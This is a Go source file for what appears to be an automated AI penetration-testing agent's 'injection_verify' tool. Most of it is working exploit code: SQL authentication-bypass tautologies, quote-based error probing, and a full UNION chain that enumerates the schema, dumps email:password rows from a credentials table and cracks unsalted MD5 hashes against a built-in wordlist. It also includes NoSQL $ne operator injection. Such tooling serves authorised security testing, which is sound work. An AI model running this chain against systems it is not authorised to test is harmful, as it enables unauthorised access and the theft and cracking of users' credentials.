package agent

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"sort"
	"strings"
	"time"

	actool "artemis/engine/tool"
)

// Deterministic injection prober: the group-DB oracle. A weak model triggers a SQL
// error and stops, or eyeballs a 200 and guesses. This tool does in code the chain
// the 30B cannot sustain, and returns a verdict from EVIDENCE, not from a hunch:
//
//   - auth-bypass (V01): sweep a generic login-path wordlist, compare a baseline
//     wrong-credentials POST against an OR-1=1 payload; a payload that flips an
//     unauthenticated endpoint into one returning an auth token is a confirmed
//     bypass.
//   - error-based (V14) + injectability (V02/V03): inject quote payloads into GET
//     query params; a SQL error signature in the response is a verbose-error
//     disclosure AND proof the parameter is injectable.
//   - UNION column count (V02, best effort): once a param is injectable, probe the
//     column count with UNION SELECT NULLs.
//   - NoSQL (V07): inject Mongo operators ($ne/$gt) into JSON body fields; a
//     response that materially diverges from the baseline is a confirmed NoSQLi.
//
// Everything here is generic technique (payload batteries, wordlists), never a fact
// about a specific target: no table names, no row counts, no app-specific paths
// beyond a generic login wordlist. Bounded by a request cap and a ctx deadline.

// sqlErrorRe matches the verbose SQL error signatures of the common engines. A hit
// is both V14 (verbose error disclosure) and proof the input reaches the SQL layer.
var sqlErrorRe = regexp.MustCompile(`(?i)(SQLITE_ERROR|SQL ?ITE3?::|syntax error|SQL syntax|unterminated|unrecognized token|no such column|near ".*": syntax|ORA-\d{5}|PG::|psql:|PostgreSQL.*ERROR|mysql_fetch|MySQLSyntaxError|You have an error in your SQL|ODBC SQL|SQLSTATE\[|System\.Data\.SqlClient|Microsoft OLE DB|Unclosed quotation)`)

// jwtRe / authTokenRe detect that a response authenticated the caller (a JWT, or a
// token/authentication field). Baseline wrong creds must NOT produce this.
var jwtRe = regexp.MustCompile(`eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.`)
var authTokenRe = regexp.MustCompile(`(?i)"(token|authentication|access_token|bearer)"\s*:`)

// loginPaths is a GENERIC wordlist of common authentication endpoints (no app
// specifics). The auth-bypass probe sweeps these under the target base.
var loginPaths = []string{
	"/rest/user/login", "/api/login", "/api/auth/login", "/api/users/login",
	"/auth/login", "/login", "/user/login", "/users/login", "/account/login",
	"/signin", "/session", "/api/session",
}

// credFields / passFields are the likely identity and secret JSON keys to inject
// into / fill for a login request.
var credFields = []string{"email", "username", "user", "login", "mail", "name"}
var passFields = []string{"password", "pass", "pwd", "passwd"}

// sqlAuthBypassPayloads: the classic authentication-bypass tautologies.
var sqlAuthBypassPayloads = []string{
	"' OR 1=1--", "' OR '1'='1'--", "' OR 1=1-- -", "admin'--", "') OR ('1'='1'--",
}

// quoteProbes: inputs that break out of a string literal and provoke a SQL error if
// the parameter is concatenated into a query.
var quoteProbes = []string{"'", "\"", "')", "';", "'--", "\"--"}

const injectionMaxRequests = 320

func looksAuthenticated(body string) bool {
	return jwtRe.MatchString(body) || authTokenRe.MatchString(body)
}

func postJSON(ctx context.Context, client *http.Client, u string, payload map[string]any) (status int, body string, ok bool) {
	b, _ := json.Marshal(payload)
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, u, bytes.NewReader(b))
	if err != nil {
		return 0, "", false
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", false
	}
	defer resp.Body.Close()
	rb, _ := io.ReadAll(io.LimitReader(resp.Body, exposureBodyCap))
	return resp.StatusCode, string(rb), true
}

func getBody(ctx context.Context, client *http.Client, u string) (status int, body string, ok bool) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return 0, "", false
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", false
	}
	defer resp.Body.Close()
	rb, _ := io.ReadAll(io.LimitReader(resp.Body, exposureBodyCap))
	return resp.StatusCode, string(rb), true
}

// probeAuthBypass sweeps the login wordlist and returns a non-empty confirmation
// string if an OR-1=1 payload authenticates where a wrong-credentials baseline did
// not. budget is decremented per request.
func probeAuthBypass(ctx context.Context, client *http.Client, root string, budget *int) string {
	rnd := fmt.Sprint(time.Now().UnixNano())
	for _, lp := range loginPaths {
		if ctx.Err() != nil || *budget <= 0 {
			break
		}
		cf, pf := credFields[0], passFields[0]
		// baseline: wrong credentials must NOT authenticate, else this endpoint is
		// not a usable oracle (it hands a token to everyone).
		base := map[string]any{cf: "nobody_" + rnd + "@artemis.invalid", pf: "wrong_" + rnd}
		*budget--
		bs, bb, ok := postJSON(ctx, client, root+lp, base)
		if !ok {
			continue
		}
		if looksAuthenticated(bb) {
			continue // endpoint authenticates anything: not a bypass oracle
		}
		_ = bs
		for _, pl := range sqlAuthBypassPayloads {
			if ctx.Err() != nil || *budget <= 0 {
				break
			}
			*budget--
			ps, pb, ok := postJSON(ctx, client, root+lp, map[string]any{cf: pl, pf: "x"})
			if !ok {
				continue
			}
			if ps >= 200 && ps < 300 && looksAuthenticated(pb) {
				return fmt.Sprintf(
					"auth bypass at %s: payload %q in field %q returned an authenticated session (HTTP %d with a token) "+
						"while a wrong-credentials baseline did not", lp, pl, cf, ps)
			}
		}
	}
	return ""
}

// probeParamSQLi injects quote payloads into each query param of urlStr; on a SQL
// error (error-based / V14) AND/OR a working UNION it reports injection, and when a
// UNION reflects it attempts a generic data dump (V02 extraction + V12 weak hashes).
func probeParamSQLi(ctx context.Context, client *http.Client, urlStr string, budget *int) string {
	base, err := url.Parse(urlStr)
	if err != nil {
		return ""
	}
	q := base.Query()
	if len(q) == 0 {
		return ""
	}
	for name := range q {
		errProbe := ""
		for _, qp := range quoteProbes {
			if ctx.Err() != nil || *budget <= 0 {
				break
			}
			u := *base
			nq := u.Query()
			nq.Set(name, q.Get(name)+qp)
			u.RawQuery = nq.Encode()
			*budget--
			_, body, ok := getBody(ctx, client, u.String())
			if ok && sqlErrorRe.MatchString(body) {
				errProbe = qp
				break
			}
		}
		union := dumpUnion(ctx, client, base, name, budget)
		if errProbe == "" && union == "" {
			continue
		}
		var parts []string
		if errProbe != "" {
			parts = append(parts, fmt.Sprintf("payload %q provoked a verbose SQL error (injectable parameter + V14 verbose-error disclosure)", errProbe))
		}
		if union != "" {
			parts = append(parts, union)
		}
		return fmt.Sprintf("SQL injection at %s (param %q): %s", base.Path, name, strings.Join(parts, "; "))
	}
	return ""
}

// --- generic UNION data dump (V02 extraction) + weak-hash surfacing (V12) --------
//
// Once a GET parameter is injectable, this extracts real data instead of merely
// proving a column count: it discovers a working UNION (breakout/comment/column
// count via REFLECTED string markers), enumerates a credentials-like table from the
// schema (sqlite_master, then information_schema), dumps identity:secret rows, and
// classifies the secrets (32-hex -> unsalted MD5 = V12). All generic technique: a
// breakout/comment battery, a column-noun wordlist, no target-specific table/column
// names baked in.

var sqlBreakouts = []string{"'))", "')", "'", "\"", "))", ""}
var sqlComments = []string{"-- -", "-- "}

var sqlUserTableRe = regexp.MustCompile(`(?i)[A-Za-z0-9_]*(?:user|account|member|credential|customer|login)[A-Za-z0-9_]*`)
var sqlMailColRe = regexp.MustCompile(`(?i)[A-Za-z0-9_]*(?:email|mail)[A-Za-z0-9_]*`)
var sqlIdentColRe = regexp.MustCompile(`(?i)[A-Za-z0-9_]*(?:username|userid|user|login|account|name)[A-Za-z0-9_]*`)
var sqlPassColRe = regexp.MustCompile(`(?i)[A-Za-z0-9_]*(?:password|passwd|pwd|secret|hash)[A-Za-z0-9_]*`)
var hexOnlyRe = regexp.MustCompile(`^[0-9a-fA-F]+$`)

const (
	dumpSentStart = "AFXS9K"
	dumpSentEnd   = "9KAFXE"
	dumpRowLimit  = 25
)

func injectParamURL(base *url.URL, param, payload string) string {
	u := *base
	q := u.Query()
	q.Set(param, q.Get(param)+payload)
	u.RawQuery = q.Encode()
	return u.String()
}

// jsonUnescapeLite reverses the common JSON string escapes, enough to read a dumped
// value out of a JSON response body.
func jsonUnescapeLite(s string) string {
	return strings.NewReplacer(`\n`, "\n", `\t`, "\t", `\/`, "/", `\"`, `"`, `\\`, `\`).Replace(s)
}

// unionMarker is the per-column discovery value: a NUMERIC string (so a
// type-sensitive column like a price/id does not make the app error on the row)
// that is still distinctive enough to detect in the response.
func unionMarker(i int) string { return fmt.Sprintf("'%d'", 9000000+i) }

// betweenAll returns every substring delimited by a...b in s (non-overlapping).
func betweenAll(s, a, b string) []string {
	var out []string
	for {
		i := strings.Index(s, a)
		if i < 0 {
			return out
		}
		s = s[i+len(a):]
		j := strings.Index(s, b)
		if j < 0 {
			return out
		}
		out = append(out, jsonUnescapeLite(s[:j]))
		s = s[j+len(b):]
	}
}

// fetchAllInjected runs one UNION payload and returns every sentinel-delimited value
// in the response (one per UNION row).
func fetchAllInjected(ctx context.Context, client *http.Client, base *url.URL, param, payload string, budget *int) []string {
	if *budget <= 0 || ctx.Err() != nil {
		return nil
	}
	*budget--
	_, body, ok := getBody(ctx, client, injectParamURL(base, param, payload))
	if !ok {
		return nil
	}
	return betweenAll(body, dumpSentStart, dumpSentEnd)
}

// orderPositions prefers a non-first output column (the first column is often a
// type-sensitive id that errors on a long string), then the first.
func orderPositions(r []int) []int {
	var nz, z []int
	for _, p := range r {
		if p == 0 {
			z = append(z, p)
		} else {
			nz = append(nz, p)
		}
	}
	return append(nz, z...)
}

func dumpUnion(ctx context.Context, client *http.Client, base *url.URL, param string, budget *int) string {
	// 1. find breakout + column count. Numeric markers (type-safe) and a 2xx gate:
	//    at the RIGHT column count the app returns the injected rows with HTTP 200;
	//    wrong counts error (500) and are skipped.
	breakout, comment, n := "", "", 0
	var reflected []int
findUnion:
	for col := 1; col <= 12; col++ {
		for _, bo := range sqlBreakouts {
			for _, cm := range sqlComments {
				if *budget <= 0 || ctx.Err() != nil {
					break findUnion
				}
				cols := make([]string, col)
				for i := range cols {
					cols[i] = unionMarker(i)
				}
				*budget--
				st, body, ok := getBody(ctx, client, injectParamURL(base, param, bo+" UNION SELECT "+strings.Join(cols, ",")+" "+cm))
				if !ok || st < 200 || st >= 300 {
					continue
				}
				var hits []int
				for i := 0; i < col; i++ {
					if strings.Contains(body, fmt.Sprintf("%d", 9000000+i)) {
						hits = append(hits, i)
					}
				}
				if len(hits) > 0 {
					breakout, comment, n, reflected = bo, cm, col, hits
					break findUnion
				}
			}
		}
	}
	if n == 0 {
		return ""
	}
	colNote := fmt.Sprintf("UNION confirmed (%d columns)", n)

	// extract places a BARE column expression (wrapped in sentinels) into the UNION
	// with a FROM clause appended, so the source yields one UNION row per source row
	// (the working pattern: FROM on the UNION SELECT, bare columns, not aggregates or
	// scalar subqueries). It returns EVERY sentinel-delimited value found, trying each
	// reflected output column (preferring a string-friendly one) and caching the first
	// that works for the rest of the dump.
	positions := orderPositions(reflected)
	good := -1
	extract := func(colExpr, fromClause string) []string {
		try := positions
		if good >= 0 {
			try = []int{good}
		}
		for _, p := range try {
			cols := make([]string, n)
			for i := range cols {
				cols[i] = unionMarker(i)
			}
			cols[p] = "'" + dumpSentStart + "'||(" + colExpr + ")||'" + dumpSentEnd + "'"
			payload := breakout + " UNION SELECT " + strings.Join(cols, ",")
			if fromClause != "" {
				payload += " " + fromClause
			}
			payload += " " + comment
			if vs := fetchAllInjected(ctx, client, base, param, payload, budget); len(vs) > 0 {
				good = p
				return vs
			}
		}
		return nil
	}

	// 2. enumerate tables: sqlite_master, then information_schema.
	engine := "sqlite"
	tables := extract("name", "FROM sqlite_master WHERE type='table'")
	if len(tables) == 0 {
		engine = "information_schema"
		tables = extract("table_name", "FROM information_schema.tables")
	}
	tbl := sqlUserTableRe.FindString(strings.Join(tables, ","))
	if tbl == "" {
		return colNote + ", but no credentials-like table resolved from the schema (extraction not completed)"
	}

	// 3. resolve identity + secret columns of that table.
	var schema string
	if engine == "sqlite" {
		schema = strings.Join(extract("sql", "FROM sqlite_master WHERE name='"+tbl+"'"), " ")
		// Drop "CREATE TABLE <name>" so the table name (which contains "user") is not
		// mistaken for an identity COLUMN; column defs live inside the first paren.
		if i := strings.Index(schema, "("); i >= 0 {
			schema = schema[i+1:]
		}
	} else {
		schema = strings.Join(extract("column_name", "FROM information_schema.columns WHERE table_name='"+tbl+"'"), " ")
	}
	emailCol := sqlMailColRe.FindString(schema) // prefer a real email/mail column
	if emailCol == "" {
		emailCol = sqlIdentColRe.FindString(schema) // else username/login/name
	}
	passCol := sqlPassColRe.FindString(schema)
	if passCol == "" {
		return colNote + fmt.Sprintf(", table %q found but no secret-like column resolved (extraction not completed)", tbl)
	}
	if emailCol == "" {
		emailCol = passCol
	}

	// 4. dump bounded rows (one UNION row per source row).
	rows := extract(
		fmt.Sprintf("%s||char(58)||%s", emailCol, passCol),
		fmt.Sprintf("FROM %s LIMIT %d", tbl, dumpRowLimit))
	if len(rows) == 0 {
		return colNote + fmt.Sprintf(", table %q (%s:%s) found but the row dump came back empty", tbl, emailCol, passCol)
	}

	// 5. parse + classify hashes.
	md5, total, sample := 0, 0, ""
	for _, ln := range rows {
		if ln = strings.TrimSpace(ln); ln == "" {
			continue
		}
		total++
		h := ln
		if i := strings.LastIndex(ln, ":"); i >= 0 {
			h = ln[i+1:]
		}
		if len(h) == 32 && hexOnlyRe.MatchString(h) {
			md5++
		}
		if sample == "" {
			sample = ln
		}
	}
	verdict := fmt.Sprintf("%s. DATA EXTRACTED (V02): dumped %d row(s) from table %q (%s:%s) via UNION", colNote, total, tbl, emailCol, passCol)
	if md5 > 0 {
		verdict += fmt.Sprintf("; %d secret(s) are unsalted 32-hex MD5 (V12 weak-hash finding)", md5)
		// V12 end-to-end: quick-crack the dumped MD5s against the built-in common
		// password list (embedded only, bounded). A bigger dictionary is available via
		// the standalone hash_crack tool.
		if cracked := crackMD5(extractMD5Hashes(strings.Join(rows, "\n")), embeddedWords(), len(embeddedWords())); len(cracked) > 0 {
			var cs []string
			for h, w := range cracked {
				cs = append(cs, h+"="+w)
			}
			verdict += fmt.Sprintf("; %d CRACKED with the built-in dictionary: %s", len(cracked), clipXSS(strings.Join(cs, ", "), 160))
		}
	}
	verdict += fmt.Sprintf(" (sample: %s)", clipXSS(sample, 80))
	return verdict
}

// probeNoSQL replaces each string field of a JSON body with a Mongo operator object
// and reports a confirmation if the response diverges materially from the baseline.
func probeNoSQL(ctx context.Context, client *http.Client, method, urlStr, bodyJSON string, budget *int) string {
	var obj map[string]any
	if json.Unmarshal([]byte(bodyJSON), &obj) != nil || len(obj) == 0 {
		return ""
	}
	req := func(b map[string]any) (int, string, bool) {
		raw, _ := json.Marshal(b)
		r, err := http.NewRequestWithContext(ctx, strings.ToUpper(method), urlStr, bytes.NewReader(raw))
		if err != nil {
			return 0, "", false
		}
		r.Header.Set("Content-Type", "application/json")
		resp, err := client.Do(r)
		if err != nil {
			return 0, "", false
		}
		defer resp.Body.Close()
		rb, _ := io.ReadAll(io.LimitReader(resp.Body, exposureBodyCap))
		return resp.StatusCode, string(rb), true
	}
	*budget--
	bst, bbody, ok := req(obj)
	if !ok {
		return ""
	}
	for k, v := range obj {
		if _, isStr := v.(string); !isStr {
			continue
		}
		if ctx.Err() != nil || *budget <= 0 {
			break
		}
		mut := map[string]any{}
		for kk, vv := range obj {
			mut[kk] = vv
		}
		mut[k] = map[string]any{"$ne": nil}
		*budget--
		pst, pbody, ok := req(mut)
		if !ok {
			continue
		}
		// Divergence: a different status, or the operator unlocked a materially
		// larger/positive response where the baseline was rejected.
		if pst != bst && (pst >= 200 && pst < 300) && (bst < 200 || bst >= 300) {
			return fmt.Sprintf(
				"NoSQL injection at %s (field %q): a {\"$ne\":null} operator changed the outcome from HTTP %d to HTTP %d, "+
					"so the field is interpreted as a query operator, not a literal", urlStr, k, bst, pst)
		}
		if pst >= 200 && pst < 300 && len(pbody) > len(bbody)*2 && len(bbody) > 0 {
			return fmt.Sprintf(
				"NoSQL injection at %s (field %q): a {\"$ne\":null} operator returned a response ~%dx larger than the "+
					"baseline, consistent with an unfiltered operator matching all records", urlStr, k, len(pbody)/max1(len(bbody)))
		}
	}
	return ""
}

func max1(n int) int {
	if n < 1 {
		return 1
	}
	return n
}

func (t *ToolSet) injectionVerify() actool.CoreTool {
	schema := map[string]any{
		"type": "object",
		"properties": map[string]any{
			"url": map[string]any{
				"type":        "string",
				"description": "Target URL. A base URL (http://host:3000) triggers an auth-bypass sweep of common login paths. A URL with query params (http://host:3000/rest/products/search?q=x) triggers error-based SQLi and UNION column probing on those params.",
			},
			"method": map[string]any{
				"type":        "string",
				"description": "Optional HTTP method for the NoSQL mode (e.g. PATCH, POST). Defaults to POST when a body is given.",
			},
			"body": map[string]any{
				"type":        "string",
				"description": "Optional JSON request body. When given, the verifier runs NoSQL-operator injection ($ne/$gt) on its string fields.",
			},
		},
		"required": []any{"url"},
	}
	desc := "Deterministically CONFIRM or REFUTE SQL/NoSQL injection from EVIDENCE, not a hunch. Given a base URL it sweeps common login paths and confirms an authentication bypass only if an OR-1=1 payload authenticates where wrong credentials did not. Given a URL with query params it injects quote payloads and confirms SQL injection on a verbose SQL error (also a V14 disclosure), then attempts a generic UNION data dump (enumerate schema, dump a credentials table, flag weak MD5 hashes). Given a JSON body it injects Mongo operators and confirms NoSQL injection on a material response divergence. Use this instead of concluding injection from a single error or a 200: a reflected error is not a dump, and a 200 is not a bypass. Pass the base URL for auth-bypass, or an endpoint URL (with params or a JSON body) for injection."
	return readTool("injection_verify", desc, schema, func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
		var a struct {
			URL    string `json:"url"`
			Method string `json:"method"`
			Body   string `json:"body"`
		}
		_ = json.Unmarshal(in, &a)
		raw := strings.TrimSpace(a.URL)
		if raw == "" {
			return actool.Errorf("url is required: pass the base URL (auth-bypass) or an endpoint URL (SQLi/NoSQL)"), nil
		}
		base, err := url.Parse(raw)
		if err != nil || base.Host == "" {
			return actool.Errorf("injection_verify needs an absolute URL (scheme://host[:port]/path), got: " + clipXSS(raw, 120)), nil
		}
		client := &http.Client{
			Timeout: 8 * time.Second,
			CheckRedirect: func(_ *http.Request, _ []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}
		runCtx, cancel := context.WithTimeout(ctx, 120*time.Second)
		defer cancel()
		budget := injectionMaxRequests

		var hits []string
		// NoSQL mode: an explicit JSON body was given.
		if strings.TrimSpace(a.Body) != "" {
			method := a.Method
			if method == "" {
				method = http.MethodPost
			}
			if h := probeNoSQL(runCtx, client, method, base.String(), a.Body, &budget); h != "" {
				hits = append(hits, h)
			}
		}
		// SQLi mode: the URL carries query params.
		if len(base.Query()) > 0 {
			if h := probeParamSQLi(runCtx, client, base.String(), &budget); h != "" {
				hits = append(hits, h)
			}
		}
		// Auth-bypass mode: always worth a sweep from the host root.
		root := base.Scheme + "://" + base.Host
		if h := probeAuthBypass(runCtx, client, root, &budget); h != "" {
			hits = append(hits, h)
		}

		if len(hits) == 0 {
			return actool.Text(
				"No injection confirmed: wrong-credentials vs OR-1=1 did not flip authentication on the swept login paths, " +
					"no quote payload provoked a SQL error on the query parameters, and no NoSQL operator changed the outcome. " +
					"record_fact the negative; do NOT report_finding."), nil
		}
		return actool.Text(fmt.Sprintf(
			"CONFIRMED injection. %s. This is a verified exploit: report_finding (SQL/NoSQL injection, critical/high) with the "+
				"request and response as reproduction. Do NOT record it as a negative.",
			strings.Join(hits, "; "))), nil
	})
}

// --- recognizer (Surface -> intent texts) ------------------------------------

const maxInjectionExpandIntents = 15

// injectionCandidates keeps one endpoint per path that carries ANY query param
// (every query param is a SQLi candidate, unlike the redirect-only filter),
// shallow-first, capped.
func injectionCandidates(params []ParamHit, maxN int) []ParamHit {
	if maxN <= 0 {
		maxN = maxInjectionExpandIntents
	}
	byPath := map[string]string{}
	var order []string
	for _, h := range params {
		if h.Path == "" || h.Param == "" {
			continue
		}
		if _, ok := byPath[h.Path]; ok {
			continue
		}
		byPath[h.Path] = h.Param
		order = append(order, h.Path)
	}
	sortPathsShallowFirst(order)
	out := make([]ParamHit, 0, len(order))
	for _, p := range order {
		out = append(out, ParamHit{Path: p, Param: byPath[p]})
	}
	if len(out) > maxN {
		out = out[:maxN]
	}
	return out
}

func injectionSummaries(s Surface, maxN int) []string {
	if strings.TrimSpace(s.Base) == "" {
		return nil
	}
	var out []string
	// One auth-bypass intent per task (sweeps login paths itself).
	out = append(out, injectionAuthBypassSummary(s.Base))
	// One SQLi intent per observed GET-param endpoint. The example value is a
	// placeholder; the verifier injects into the real parameter(s).
	for _, c := range injectionCandidates(s.Params, maxN) {
		u := s.Base + "/" + strings.TrimPrefix(c.Path, "/") + "?" + c.Param + "=1"
		out = append(out, injectionParamSummary(c.Path, c.Param, u))
	}
	return out
}

// sortPathsShallowFirst orders paths so the shallow top-level ones come first
// (fewer segments, then shorter, then lexical), so they survive a cap rather than
// an arbitrary alphabetical cut. Shared by the parameter-driven recognizers.
func sortPathsShallowFirst(paths []string) {
	sort.Slice(paths, func(i, j int) bool {
		si, sj := strings.Count(paths[i], "/"), strings.Count(paths[j], "/")
		if si != sj {
			return si < sj
		}
		if len(paths[i]) != len(paths[j]) {
			return len(paths[i]) < len(paths[j])
		}
		return paths[i] < paths[j]
	})
}

// injectionAuthBypassSummary: must canonicalize to "authbypass", so the text
// deliberately avoids the earlier-matching tokens "SQL injection"/"sqli" (which
// intentClass would resolve first) and uses "authentication bypass" / "login
// tautology" instead. Prose stays slash-free before any path for the dedup key.
func injectionAuthBypassSummary(base string) string {
	return fmt.Sprintf(
		"Authentication bypass check using a login tautology: call injection_verify with the base URL %s (no params). "+
			"It sweeps common login endpoints and confirms a bypass only if a tautology payload authenticates where a "+
			"wrong-credentials baseline does not. If CONFIRMED, report_finding (authentication bypass, critical) with the "+
			"request and the token response as reproduction. If not, record_fact the negative and do NOT report_finding. "+
			"Do NOT conclude a bypass from a 200 alone.",
		base)
}

// injectionParamSummary: canonicalizes to "sqli" via "SQL injection"; endpoint path
// is the FIRST slash-word for the dedup key.
func injectionParamSummary(endpoint, param, url string) string {
	return fmt.Sprintf(
		"SQL injection check on the endpoint %s: call injection_verify with the URL %s (observed query parameter: %s). "+
			"It injects quote payloads, confirms injection on a verbose SQL error or a working UNION, then attempts a real UNION data dump (schema enumeration + credentials table + weak-hash flag). "+
			"If CONFIRMED, report_finding (SQL injection) with the request and response as reproduction. If no SQL error "+
			"is provoked, record_fact the negative and do NOT report_finding. Do NOT conclude injection from a bare 200.",
		endpoint, url, param)
}
